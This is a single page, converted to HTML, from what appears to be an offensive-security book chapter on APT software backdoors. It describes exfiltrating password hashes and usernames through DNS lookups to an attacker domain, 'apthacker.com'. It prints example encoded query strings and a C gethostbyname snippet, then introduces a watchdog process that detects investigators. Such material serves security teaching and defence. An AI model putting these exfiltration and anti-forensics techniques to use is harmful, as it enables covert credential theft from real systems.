<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pf1b8" class="pf w2 h2" data-page-no="1b8"><div class="pc pc1b8 w2 h2"><div class="t m0 x6 h10 y83 ff2 fs2 fc0 sc0 ls8 ws0">Chapter 10: APT Software Backdoors<span class="_ _9"> </span><span class="ff1 fs9 lsa">417</span></div><div class="t m0 x3 hd y11c ff4 fs7 fc0 sc0 ls0 ws0">you nd a cleartext passw<span class="_ _0"/>ord that is more than 63 characters, then you are in a very </div><div class="t m0 x3 hd y11d ff4 fs7 fc0 sc0 ls0 ws0">strange place indeed.</div><div class="t m0 x4 hd y11e ff4 fs7 fc0 sc0 ls0 ws0">W<span class="_ _3"/>e then have our backdoor attempt to resolv<span class="_ _0"/>e the record—for example, here is a </div><div class="t m0 x3 hd y11f ff4 fs7 fc0 sc0 ls0 ws0">blank LM password hash:</div><div class="t m0 x65 hd y5c7 ff4 fs7 fc0 sc0 ls0 ws0">aad3b435b51404eeaad3b435b51404ee.apthacker<span class="_ _2"/>.com</div><div class="t m0 x4 hd y278e ff4 fs7 fc0 sc0 ls0 ws0">And since we still hav<span class="_ _0"/>e plenty of room to spare, we could also include some error </div><div class="t m0 x3 hd y278f ff4 fs7 fc0 sc0 ls0 ws0">checking, or the user’<span class="_ _2"/>s name, such as the following:</div><div class="t m0 x65 hd y2790 ff4 fs7 fc0 sc0 ls0 ws0">001XXXaad3b435b51404eeaad3b435b51404ee.apthacker<span class="_ _2"/>.com</div><div class="t m0 x65 hd y2791 ff4 fs7 fc0 sc0 ls0 ws0">001XXXTheUserXXXaad3b435b51404eeaad3b435b51404ee.apthacker<span class="_ _2"/>.com</div><div class="t m0 x65 hd y2792 ff4 fs7 fc0 sc0 ls0 ws0">YWQzYjQzNWI1MTQwNGVlYWFkM2I0MzV<span class="_ _2"/>iNTE0MDRlZQo.apthacker</div><div class="t m0 x65 hd y2793 ff4 fs7 fc0 sc0 ls0 ws0">.com</div><div class="t m0 x4 hd y2794 ff4 fs7 fc0 sc0 ls0 ws0">Y<span class="_ _1b"/>ou can see here we’<span class="_ _0"/>ve implemented a crude system of numbering the request </div><div class="t m0 x3 hd y2795 ff4 fs7 fc0 sc0 ls0 ws0">(001) and implementing the bounds for the dif<span class="_ _0"/>ferent elds with three X characters </div><div class="t m0 x3 hd y2796 ff4 fs7 fc0 sc0 ls0 ws0">(XXX). Of course, we might not want to send this in clearte<span class="_ _0"/>xt, as it may be a little </div><div class="t m0 x3 hd y2797 ff4 fs7 fc0 sc0 ls0 ws0">obvious, so implementing some simple shifting, a Caesar cipher<span class="_ _2"/>, or even just base64 </div><div class="t m0 x3 hd y2798 ff4 fs7 fc0 sc0 ls0 ws0">encoding as in the last example might be a good option. <span class="_ _0"/>T<span class="_ _3"/>o have the backdoor </div><div class="t m0 x3 hd y2799 ff4 fs7 fc0 sc0 ls0 ws0">actually attempt to resolve the DNS record, we w<span class="_ _0"/>ould just use the gethostbyname </div><div class="t m0 x3 hd y279a ff4 fs7 fc0 sc0 ls0 ws0">function call, as in the follo<span class="_ _0"/>wing example:</div><div class="t m0 x3 h44 y1853 fff fse fc0 sc0 ls0 ws0">char HostName[] =   “001XXXaad3b435b51404eeaad3b435b51404ee.</div><div class="t m0 x3 h44 y279b fff fse fc0 sc0 ls0 ws0">apthacker.com”;</div><div class="t m0 x3 h44 y279c fff fse fc0 sc0 ls0 ws0"> if ( (host=gethostbyname(HostName)) == NULL )</div><div class="t m0 x3 h44 y279d fff fse fc0 sc0 ls0 ws0">    return 1;</div><div class="t m0 x4 hd y279e ff4 fs7 fc0 sc0 ls0 ws0">In this case, it doesn’t e<span class="_ _0"/>v<span class="_ _0"/>en matter if the backdoored host doesn’t ha<span class="_ _0"/>ve direct </div><div class="t m0 x3 hd y279f ff4 fs7 fc0 sc0 ls0 ws0">access to the Internet, since any attempt to resolv<span class="_ _0"/>e the DNS name will e<span class="_ _0"/>ventually </div><div class="t m0 x3 hd y27a0 ff4 fs7 fc0 sc0 ls0 ws0">request that DNS record from our DNS server<span class="_ _2"/>. Of course, we would need to ha<span class="_ _0"/>ve </div><div class="t m0 x3 hd y27a1 ff4 fs7 fc0 sc0 ls0 ws0">access to the log les of the DNS servers responsible for our domain, b<span class="_ _0"/>ut that should </div><div class="t m0 x3 hd y27a2 ff4 fs7 fc0 sc0 ls0 ws0">go without saying. This scenario is sho<span class="_ _0"/>wn in Figure 10-1.</div><div class="t m0 x3 h4 y27a3 ff2 fs1 fc0 sc0 ls0 ws0">Backdoor W<span class="_ _0"/>atchdog</div><div class="t m0 x3 hd y27a4 ff4 fs7 fc0 sc0 ls0 ws0">Creating a separate monitoring process is a simple task. <span class="_ _2"/>As we discussed previously<span class="_ _2"/>, </div><div class="t m0 x3 hd y27a5 ff4 fs7 fc0 sc0 ls0 ws0">this may be used to not only monitor and x any issues with our running backdoor<span class="_ _2"/>, </div><div class="t m0 x3 hd y27a6 ff4 fs7 fc0 sc0 lsb ws16">but also to monitor for actions that may be indicati<span class="_ _0"/>v<span class="_ _0"/>e of someone in<span class="_ _0"/>vestigating a </div><div class="t m0 x3 hd y27a7 ff4 fs7 fc0 sc0 ls0 ws0">compromised machine. Let’<span class="_ _2"/>s explore simple solutions for both here.</div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>